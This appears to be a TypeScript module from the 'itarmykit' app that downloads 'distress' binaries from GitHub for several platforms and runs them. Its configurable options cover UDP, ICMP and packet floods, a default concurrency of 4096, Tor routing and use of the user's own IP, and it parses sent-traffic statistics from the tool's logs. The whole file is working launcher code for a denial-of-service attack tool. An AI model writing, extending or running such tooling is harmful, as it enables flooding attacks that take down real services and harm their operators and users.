import { Module, Version, InstallProgress, InstallationTarget, BaseConfig, ModuleName } from './module'
import { getCPUArchitecture } from './archLib'
import { convertTrafficValueToBytes } from '../utils/trafficUnits'

export interface Config extends BaseConfig {
  // Disable UDP flood or not
  DisableUDPFlood: boolean;
  // Enable ICMP flood or not
  EnableICMPFlood: boolean;
  // Enable PACKET flood or not
  EnablePACKETFlood: boolean;
  // Number of concurrent tasks
  concurrency: number;
  // Number of Tor connections
  useTor: number;
  // Percentage of own IP usage
  useMyIP: number;
}

const REQUIRED_STAT_KEYS = [
  'active connections',
  'pps',
  'bps',
  'requests',
  'bytes',
  'pending connections'
] as const

function parseStatisticAssignments (message: string): Map<string, string> {
  const metrics = new Map<string, string>()
  const normalizedMessage = message.trim().toLocaleLowerCase()
  const matches = normalizedMessage.matchAll(/(?:^|,\s*)([^=,]+)=([^,]+)/g)

  for (const match of matches) {
    const key = match[1]?.trim()
    const value = match[2]?.trim()
    if (key && value) {
      metrics.set(key, value)
    }
  }

  return metrics
}

function hasRequiredStatisticKeys (metrics: Map<string, string>): boolean {
  return REQUIRED_STAT_KEYS.every((key) => metrics.has(key))
}

export class Distress extends Module<Config> {
  private invalidJsonLineCount = 0

  public override get name (): ModuleName { return 'DISTRESS' }
  public override get homeURL (): string { return 'https://github.com/Yneth/distress-releases' }
  public override get supportedInstallationTargets (): Array<InstallationTarget> {
    return [
      { arch: 'x64', platform: 'linux' },
      { arch: 'arm64', platform: 'linux' },
      { arch: 'x64', platform: 'win32' },
      { arch: 'ia32', platform: 'win32' },
      { arch: 'x64', platform: 'darwin' },
      { arch: 'arm64', platform: 'darwin' }
    ]
  }

  protected override get defaultConfig (): Config {
    return {
      autoUpdate: true,
      executableArguments: [],
      concurrency: 4096,
      DisableUDPFlood: false,
      EnableICMPFlood: false,
      EnablePACKETFlood: false,
      useMyIP: 0,
      useTor: 0
    }
  }

  override async getAllVersions (): Promise<Version[]> {
    return await this.loadVersionsFromGithub('Yneth', 'distress-releases')
  }

  private assetMapping = [
    { name: 'distress_x86_64-unknown-linux-musl', arch: 'x64', platform: 'linux' },
    { name: 'distress_aarch64-unknown-linux-musl', arch: 'arm64', platform: 'linux' },

    { name: 'distress_x86_64-pc-windows-msvc.exe', arch: 'x64', platform: 'win32' },
    { name: 'distress_i686-pc-windows-msvc.exe', arch: 'ia32', platform: 'win32' },

    { name: 'distress_x86_64-apple-darwin', arch: 'x64', platform: 'darwin' },
    { name: 'distress_aarch64-apple-darwin', arch: 'arm64', platform: 'darwin' }
  ] as Array<{
      name: string;
      arch: 'x64' | 'arm64' | 'ia32';
      platform: 'linux' | 'win32' | 'darwin';
  }>

  override async *installVersion (versionTag: string): AsyncGenerator<InstallProgress, void, void> {
    const progressGenerator = this.installVersionFromGithub('Yneth', 'distress-releases', versionTag, this.assetMapping)

    for await (const progress of progressGenerator) {
      yield progress
    }
  }

  override async start (): Promise<void> {
    const settings = await this.settings.getData()
    const config = await this.getConfig()

    const args = [] as string[]
    if (settings.itarmy.uuid !== '') {
      args.push('--user-id', settings.itarmy.uuid)
    }
    args.push('--child', '--json-logs')
    if (config.concurrency > 0) {
      args.push('--concurrency', config.concurrency.toString())
    }
    if (config.useTor > 0) {
      args.push('--use-tor', config.useTor.toString())
    }
    if (config.useMyIP > 0) {
      args.push('--use-my-ip', config.useMyIP.toString())
    }
    if (config.useMyIP > 0 && config.DisableUDPFlood) {
      args.push('--disable-udp-flood')
    }
    if (config.useMyIP > 0 && config.EnableICMPFlood) {
      args.push('--enable-icmp-flood')
    }
    if (config.useMyIP > 0 && config.EnablePACKETFlood) {
      args.push('--enable-packet-flood')
    }
    args.push('--source', 'itarmykit')
    args.push(...config.executableArguments.filter(arg => arg !== ''))

    let filename = 'distress_x86_64-unknown-linux-musl'
    for (const asset of this.assetMapping) {
      if (asset.arch === getCPUArchitecture() && asset.platform === process.platform) {
        filename = asset.name
        break
      }
    }

    const handler = await this.startExecutable(filename, args)

    // Process statistics
    let statisticsBuffer = ''
    handler.stdout.on('data', (data: Buffer) => {
      statisticsBuffer += data.toString()

      const lines = statisticsBuffer.split(/\r?\n/)
      if (/\r?\n$/.test(statisticsBuffer)) {
        statisticsBuffer = ''
      } else {
        statisticsBuffer = lines.pop() as string
      }

      for (const line of lines) {
        const trimmedLine = line.trim()
        if (trimmedLine === '' || !trimmedLine.startsWith('{')) {
          continue
        }

        try {
          const lineJSON = JSON.parse(trimmedLine)
          const msg = lineJSON.msg as string

          const metrics = parseStatisticAssignments(msg)
          if (!hasRequiredStatisticKeys(metrics)) {
            continue
          }

          const bytesSend = convertTrafficValueToBytes(metrics.get('bytes') ?? '')
          const currentSendBitrate = convertTrafficValueToBytes(metrics.get('bps') ?? '')
          if (bytesSend < 0 || currentSendBitrate < 0) {
            continue
          }

          this.emit('execution:statistics', {
            type: 'execution:statistics',
            bytesSend: Number(bytesSend),
            currentSendBitrate,
            timestamp: new Date().getTime()
          })
        } catch (e) {
          this.invalidJsonLineCount++
          if (this.invalidJsonLineCount <= 3 || this.invalidJsonLineCount % 50 === 0) {
            console.warn('[Distress] Skipping malformed JSON log line', {
              error: String(e),
              sample: trimmedLine.slice(0, 200),
              skippedCount: this.invalidJsonLineCount
            })
          }
        }
      }
    })
  }

  override async stop (): Promise<void> {
    await this.stopExecutable()
  }
}
